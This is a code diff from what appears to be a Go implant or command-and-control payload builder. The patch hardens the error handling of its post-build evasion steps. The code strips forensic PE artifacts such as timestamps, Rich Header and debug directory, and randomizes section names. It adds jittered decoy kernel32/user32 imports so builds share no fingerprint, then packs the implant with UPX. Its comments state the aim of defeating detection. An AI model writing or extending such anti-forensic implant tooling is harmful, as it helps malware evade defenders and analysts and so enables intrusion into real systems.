@@ -16,57 +16,78 @@ import (
 // benign-import mimicry. Every step uses fresh crypto/rand material so two
 // binaries built from the same config never share PE headers. Callers must
 // run patchSelfCheckHash AFTER this so the integrity hash covers final bytes.
-func finalizePE(outPath string, cfg ImplantConfig, goarch string) {
+//
+// A requested transformation that cannot be applied is an error: silently
+// returning an unstripped or partially modified payload would violate the
+// operator's selection.
+func finalizePE(outPath string, cfg ImplantConfig, goarch string) error {
 	switch cfg.PETimestampMode {
 	case "keep":
 		// keep original Go timestamp
 	default:
 		if err := stripPEArtifacts(outPath); err != nil {
-			fmt.Fprintf(os.Stderr, "warning: strip PE artifacts: %v\n", err)
+			return fmt.Errorf("strip PE artifacts: %w", err)
 		}
 		if cfg.PETimestampMode == "random" {
-			if ts, err := GenerateTimestamp(TSRandom, ""); err == nil {
-				if data, err := os.ReadFile(outPath); err == nil {
-					ApplyTimestamp(data, ts)
-					_ = os.WriteFile(outPath, data, 0644)
-				}
+			ts, err := GenerateTimestamp(TSRandom, "")
+			if err != nil {
+				return fmt.Errorf("generate random PE timestamp: %w", err)
+			}
+			data, err := os.ReadFile(outPath)
+			if err != nil {
+				return fmt.Errorf("read PE for timestamp patch: %w", err)
+			}
+			ApplyTimestamp(data, ts)
+			if err := os.WriteFile(outPath, data, 0755); err != nil {
+				return fmt.Errorf("write PE timestamp patch: %w", err)
 			}
 		}
 	}
 	// Optional PE section name randomization
 	if cfg.PESectionMode == "random" {
-		if data, err := os.ReadFile(outPath); err == nil {
-			cfgSec := PESectionConfig{
-				Text:  "." + randomHex(3),
-				Data:  "." + randomHex(3),
-				Rdata: "." + randomHex(3),
-				Reloc: "." + randomHex(3),
-			}
-			ApplyPESectionNames(data, cfgSec)
-			_ = os.WriteFile(outPath, data, 0644)
+		data, err := os.ReadFile(outPath)
+		if err != nil {
+			return fmt.Errorf("read PE for section randomization: %w", err)
+		}
+		cfgSec := PESectionConfig{
+			Text:  "." + randomHex(3),
+			Data:  "." + randomHex(3),
+			Rdata: "." + randomHex(3),
+			Reloc: "." + randomHex(3),
+		}
+		ApplyPESectionNames(data, cfgSec)
+		if err := os.WriteFile(outPath, data, 0755); err != nil {
+			return fmt.Errorf("write PE section names: %w", err)
 		}
 	}
 	// Optional benign import mimic with per-build subset jitter: even in
 	// kernel32+user32 mode we randomly drop to kernel32-only for some builds
 	// so the import table is not a stable fingerprint.
 	if cfg.PEImportMode != "" && cfg.PEImportMode != "none" {
-		if data, err := os.ReadFile(outPath); err == nil {
-			var dlls []string
-			if cfg.PEImportMode == "kernel32" {
-				dlls = []string{"kernel32.dll"}
-			} else {
-				dlls = []string{"kernel32.dll", "user32.dll"}
-				if b := make([]byte, 1); func() bool { _, err := rand.Read(b); return err == nil }() {
-					if b[0]%2 == 0 {
-						dlls = []string{"kernel32.dll"}
-					}
+		data, err := os.ReadFile(outPath)
+		if err != nil {
+			return fmt.Errorf("read PE for import mimicry: %w", err)
+		}
+		var dlls []string
+		if cfg.PEImportMode == "kernel32" {
+			dlls = []string{"kernel32.dll"}
+		} else {
+			dlls = []string{"kernel32.dll", "user32.dll"}
+			if b := make([]byte, 1); func() bool { _, err := rand.Read(b); return err == nil }() {
+				if b[0]%2 == 0 {
+					dlls = []string{"kernel32.dll"}
 				}
 			}
-			if out, err := AddBenignImports(data, dlls); err == nil {
-				_ = os.WriteFile(outPath, out, 0644)
-			}
+		}
+		out, err := AddBenignImports(data, dlls)
+		if err != nil {
+			return fmt.Errorf("apply benign PE imports: %w", err)
+		}
+		if err := os.WriteFile(outPath, out, 0755); err != nil {
+			return fmt.Errorf("write PE imports: %w", err)
 		}
 	}
+	return nil
 }
 
 // stripPEArtifacts removes forensic PE artifacts: timestamp, Rich Header, Debug Directory.
@@ -223,8 +244,9 @@ func validatePE(path string, machine uint16) error {
 // A missing upx binary is a skip, not an error — unlike garble, UPX is pure
 // size optimization with no security promise attached. A failed UPX run
 // restores the pre-compression bytes and fails loudly rather than shipping
-// a possibly corrupt binary. Must run BEFORE patchSelfCheckHash so the
-// integrity hash covers the final bytes.
+// a possibly corrupt binary. The original permission bits are preserved on
+// every restore path so a failed UPX pass cannot turn an ELF into a
+// non-executable file.
 func maybeCompressUPX(outPath string, cfg ImplantConfig, format string) error {
 	if !cfg.UPX {
 		return nil
@@ -242,6 +264,14 @@ func maybeCompressUPX(outPath string, cfg ImplantConfig, format string) error {
 	if err != nil {
 		return fmt.Errorf("upx: read for backup: %w", err)
 	}
+	origMode := os.FileMode(0755)
+	if info, statErr := os.Stat(outPath); statErr == nil {
+		origMode = info.Mode().Perm()
+	}
+	restore := func() {
+		_ = os.WriteFile(outPath, orig, origMode)
+		_ = os.Chmod(outPath, origMode)
+	}
 	ctx, cancel := context.WithTimeout(context.Background(), 2*time.Minute)
 	defer cancel()
 	cmd := exec.CommandContext(ctx, upxPath, "--lzma", "-q", outPath)
@@ -249,12 +279,12 @@ func maybeCompressUPX(outPath string, cfg ImplantConfig, format string) error {
 	var stderr bytes.Buffer
 	cmd.Stderr = &stderr
 	if err := cmd.Run(); err != nil {
-		_ = os.WriteFile(outPath, orig, 0644)
+		restore()
 		return fmt.Errorf("upx compression failed (original restored): %w\n%s", err, stderr.String())
 	}
 	compressed, err := os.ReadFile(outPath)
 	if err != nil || len(compressed) == 0 || len(compressed) >= len(orig) {
-		_ = os.WriteFile(outPath, orig, 0644)
+		restore()
 		if err == nil && len(compressed) >= len(orig) {
 			fmt.Printf("upx: no size gain (%d -> %d bytes), keeping original\n", len(orig), len(compressed))
 			return nil
